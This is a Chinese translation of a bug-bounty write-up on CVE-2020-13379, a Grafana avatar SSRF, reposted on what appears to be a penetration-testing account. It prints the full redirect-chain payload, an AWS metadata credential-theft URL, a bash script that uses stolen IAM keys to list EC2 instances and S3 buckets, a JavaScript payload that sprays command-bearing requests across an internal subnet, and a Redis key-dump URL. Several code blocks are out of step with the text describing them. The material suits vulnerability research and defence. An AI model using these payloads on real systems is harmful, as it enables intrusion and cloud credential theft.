<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A5aScRQFbUqIxiW3e_mgTA)

**点击蓝字 ·  关注我们**

**01**

背景

在针对 Grafana 进行赏金漏洞的安全性研究时，我发现通过将一些重定向和 URL 参数注入 Bug 链接在一起，可以在版本 3.0.1 以上的任何 Grafana 实例上实现完全读取，未经身份验证的 SSRF- 7.0.1。可以在这里找到有关该错误的 Grafana 咨询。在这篇博客中，我将引导读者了解 CVE-2020-13379 的发现和利用。

**02**

**正文**

在 Grafana api.go 文件的第 423 行定义了以下路由：

```
r.Get("/avatar/:hash", avatarCacheServer.Handler)
```

此路由从下方获取哈希 / avatar/:hash 并将其路由到 secure.grafana.com，以访问用户的图像。执行此操作的代码如下所示：

```
const (
  gravatarSource = "https://secure.gravatar.com/avatar/"
)
...
case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
```

在 this.hash 这个代码中引用是通过传递的哈希 / avatar/:hash URL 解码。这: hash 是经过 URL 解码的事实，这使我们可以将自己的参数走私到该请求中，从而导致 URL 参数注入。在上 secure.gravatar.com，如果提供 d 参数，则允许重定向到 i0.wp.com 托管某些图像的位置。这是重定向链中的第一个重定向。

为了到达 i0.wp.com 任意主机，必须对该域进行大量研究。最后，由于重定向主机验证中使用的正则表达式不正确，因此实现了开放重定向。网址的格式 i0.wp.com 如下 i0.wp.com/{domainOfImage}/{pathOfImage}。似乎 i0.wp.com 希望尽可能将其某些图像托管卸载到. bp.blogspot.com，因此对于域为的任何主机 *.bp.blogspot.com，i0.wp.com 都将重定向到该主机以避免提供图像。但是，经过大量长时间的调查，发现可以使用以下格式将其转换为开放重定向：

```
http://i0.wp.com/google.com%3f%3b/1.bp.blogspot.com/
```

通过使用此技巧，可以创建如下所示的后端重定向链：  

```
https://grafanaHost/avatar/test%3fd%3dgoogle.com%25253f%253b%252fbp.blogspot.com
```

Grafana 将字符串

```
test%3fd%3dgoogle.com%25253f%253b%252fbp.blogspot.com作为:hash
```

```
https://secure.gravatar.com/avatar/anything?d=google.com%253f%3b/1.bp.blogspot.com/
```

使用 d 参数，将重定向到 i0.wp.com。

```
http://i0.wp.com/google.com%3f%;/1.bp.blogspot.com/
```

较弱的 regexi0.wp.com 会导致指向一个开放重定向 google.com  

```
...
if avatar.Expired() {
  // The cache item is either expired or newly created, update it from the server
  if err := avatar.Update(); err != nil {
    log.Trace("avatar update error: %v", err)
    avatar = this.notFound
  }
}
if avatar.notFound {
  avatar = this.notFound
} else if !exists {
  if err := this.cache.Add(hash, avatar, gocache.DefaultExpiration); err != nil {
    log.Trace("Error adding avatar to cache: %s", err)
  }
}
ctx.Resp.Header().Add("Content-Type", "image/jpeg")
if !setting.EnableGzip {
  ctx.Resp.Header().Add("Content-Length", strconv.Itoa(len(avatar.data.Bytes())))
}
ctx.Resp.Header().Add("Cache-Control", "private, max-age=3600")
if err := avatar.Encode(ctx.Resp); err != nil {
  log.Warn("avatar encode error: %v", err)
  ctx.WriteHeader(500)
}
```

然后，以下代码添加 Content-Type: image/jpeg 标头并返回响应：  

```
https://grafanaHost/avatar/test%3fd%3dredirect.rhynorater.com%25253f%253b%252fbp.blogspot.com%252fYOURHOSTHERE
```

最后，结合使用所有这些，可以使用以下 payload 执行 SSRF：

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
```

此错误不仅影响 Grafana 实例，还影响 Gitlab 实例（在 /-/grafana 路径下）和 SourceTree 实例（在 /-/debug/grafana / 路径下）。  

**03**

**影响**

### AWS / Cloud 元数据 API

在云托管软件中发现的现代 SSRF 漏洞的最佳目标之一是 Cloud Metadata API。这些 API 中最强大的是 AWS Metadata API。该 API 允许攻击者检索附加到易受攻击的 EC2 实例的 IAM 凭据，并进入组织的内部网络。这是一项众所周知的技术，过去甚至已用于大规模违规。

作为攻击者，您将要关注的如下：

```
{
  "Code" : "Success",
  "LastUpdated" : "2019-08-15T18:13:44Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAN0P3n0W4y1nv4L1d",
  "SecretAccessKey" : "A5tGuw2QXjmqu8cTEu1zs0Dw8yt905HDCzrF0AdE",
  "Token" : "AgoJb3JpZ2luX2VjEJv//////////wEaCXVzLWVhc3QtMSJHMEUCIEX46oh4kz6AtBiTfvoHGqfVuHJI29ryAZy/wXyR51SAiEA04Pyw9HSwSIRNx6vmYpqm7sD+DkLQiFzajuwI2aLEp4q8gMIMxABGgwzNjY4OTY1NTU5NDkiDOBEJDdUKxKUkgkhGyrPA7u8oSds5hcIM0EeoHvgxvCX/ChiDsuCEFO1ctMpOgaQuunsvKLzuaTp/86V96iZzuoPLnpHHsmIUTrCcwwGqFzyaqvJpsFWdv89YIhARAMlcQ1Cc9Cs4pTBSYc/BvbEFb1z0xWqPlBNVKLMzm2K5409f/KCK/eJsxp530Zt7a1MEBp/rvceyiA5gg+6hOu65Um+4BNT+CjlEk3gwL6JUUWr9a2LKYxmyR4fc7XtLD2zB0jwdnG+EPv7aDPj7EoWMUoR/dOQav/oSHi7bl6+kT+koKzwhU/Q286qsk0kXMfG/U95TdUr70I3b/L/dhyaudpLENSU7uvPFi8qGVGpnCuZCvGL2JVSnzf8327jyuiTF7GvXlvUTh8bjxnZ8pAhqyyuxEW1tosL2NuqRHmlCCfnE3wLXJ0yBUr7uxMHTfL1gueEWghymIGhAxiYIKA9PPiHCDrn4gl5AGmLyzqxenZgcNnuwMjeTnhQ0mVf7L8PR4ZWRo9h3C1wMbYnYNi5rdfQcByMIN/XoR2J74sBPor/aObMMHVnmpNjbtRgKh0Vpi48VgXhXfuCAHka3rbYeOBYC8z8nUWYJKuxv3Nj0cQxXDnYT6LPPXmtHgZaBSUwxMHW6gU6tAHi8OEjskLZG81wLq1DiLbdPJilNrv5RPn3bBF+QkkB+URAQ8NBZA/z8mNnDfvESS44fMGFsfTIvIdANcihZQLo6VYvECV8Vw/QaLP/GbljKPwztRC5HSPe6WrC06LZS9yeTpVGZ6jFIn1O/01hJOgEwsK7+DDwcXtE5qtOynmOJiY/iUjcz79LWh184My58ueCNxJuzIM9Tbn0sH3l1eBxECTihDNbL13v5g+8ENaih+f3rNU=",
  "Expiration" : "2019-08-16T00:33:31Z"
}
```

该端点将允许您从 AWS Metadata API 提取 IAM 凭证。凭据如下所示：

```
#!/bin/bash
out=$(cat -)
export AWS_ACCESS_KEY_ID=$(echo $out | jq .AccessKeyId | sed 's/"//g' )
export AWS_SECRET_ACCESS_KEY=$(echo $out | jq .SecretAccessKey | sed 's/"//g')
export AWS_DEFAULT_REGION=us-east-1
export AWS_SESSION_TOKEN=$(echo $out | jq .Token | sed 's/"//g')
echo "Profile loaded!"
aws sts get-caller-identity
aws ec2 describe-instances > ec2Instances.txt
echo "EC2 Instances outputted to \"ec2Instances.txt\"!"
aws s3api list-buckets > s3Buckets.txt
echo "S3 Buckets outputted to \"s3Buckets.txt\"!"
```

通过 STDIN 将类似上述的 JSON Blob 放入以下脚本中，可以加载凭据，验证其功能并提取 IAM 凭据可以访问的 EC2 实例和 S3 存储桶。如果这不足以证明影响，则应进一步验证凭据。我建议使用 NCCGroup 的 Scout2，但是绝对要先从目标程序获得许可，因为这可能会非常嘈杂，并导致事件响应和 / 或很多键旋转。

```
http://169.254.169.254/latest/user-data
```

```
https: //docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html
```

该端点通常会收回许多有用的信息。尽管 AWS 文档特别警告不要在此位置存储机密，但过去在该位置我发现了 K8S 机密，IAM 凭证，SSL 证书，GitHub 凭证等。可以在以下 AWS 文档中找到有关此终结点的更多信息：

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 22
ETag: W/"16-NipK4Bud1bhsozqKdmj9bWnwGTg"
Date: Wed, 29 Jul 2020 11:21:31 GMT
Connection: keep-alive
Grafana Image Renderer
```

### 图像渲染 - 盲 SSRF

通过使用 Grafana 实例中经常出现的内部图像渲染，攻击者有可能将任意提供的 HTML 页面加载到具有任意超时值的内部无头 Google Chrome 实例中。这使攻击者可以非常有效地将一次性 RCE 喷射到内部网络中。

使用从 CVE-2020-13379 获得的内部 SSRF，可以继续进行本地主机的端口扫描。在某个任意内部端口（通常为 3001）上，可能存在一项服务，该服务将以下字符串从请求返回到：

```
localhost:3001/render?url=http://yourhost&domain=a&renderKey=a&timeout=30。
```

如果是这种情况，则可以使用终结点通过此服务呈现任意 HTML 页面

```
<script>
async function postData(url = '', data = {}) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
  return response.json();
}
for (var i = 0; i < 255; i++){
    postData('http://10.0.0.'+i+'/oneshotrce', { cmd: 'dig dnscallback.com' })
}               
</script>
```

通过创建如下所示的 HTML 文件，可以在内部高效地利用漏洞利用并尝试升级为 RCE，从而快速有效：  

```
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```

### Gitlab Prometheus Redis 出口商

如前所述，此漏洞还会影响版本 13.1.1 之前的 Gitlab 实例。根据 Gitlab 文档 Prometheus and its exporters are on by default, starting with GitLab 9.0。这些出口商提供了一种极好的方法，使攻击者可以使用 CVE-2020-13379 进行数据透视和攻击其他服务。Redis 出口商是易于利用的出口商之一。

```
example.com/fetchImage.php?image=http://localhost/image.png
```

将允许攻击者将通过 target 参数提供的 redis 服务器中的所有密钥转储。  

### 内部枢轴：仅图像 SSRF-> 全读 SSRF 链

正如我们在 avatar.go 文件的第 104 行看到的那样，此 SSRF 的响应内容类型为 image/jpeg。这为我们提供了一个独特的机会，可以将此漏洞与其他漏洞一起用于漏洞利用链。请考虑以下情形：  

```
example.com/fetchImage.php?image=http://internalgrafana/avatar/.../169.254.169.254
```

中的代码 fetchImage.php 将 HTTP 请求发送到目标位置，检查内容类型是否为 image/jpeg，如果是，则返回内容。如果攻击者随后可以识别出容易受到 CVE-2020-13379 攻击的内部 Grafana 实例，则攻击者将能够编写出完整的 SSRF，如下所示：

```
example.com/fetchImage.php?image=http://internalgrafana/avatar/.../169.254.169.254
```

由于返回的内容将是 image/jpeg，它将通过内容类型检查。这导致仅图像的 SSRF 被转换为完全读取的 SSRF。由于在 Grafana 攻击中发生了由攻击者控制的重定向，因此也有可能欺骗文件扩展名检查。

**04**

**结论**

总之，此漏洞并不是非常复杂，其最有趣的功能是 URL 参数走私漏洞，该漏洞发生在: hash 将 API 路由中的 URL 与内部 HTTP 请求串联在一起时。无论如何，该错误的影响很大，并且是一个非常可靠的漏洞。

**EDI 安全**

![](https://mmbiz.qpic.cn/mmbiz_jpg/rJALXSMzgem8X7wIEWOlQY35suI7kByfIo54wIkSTuguVHjZXialdFprIxZp0keNOpw7iblGQicrMnGAdWdDySSeg/640?wx_fmt=jpeg)

**扫二维码｜关注我们**

一个专注渗透实战经验分享的公众号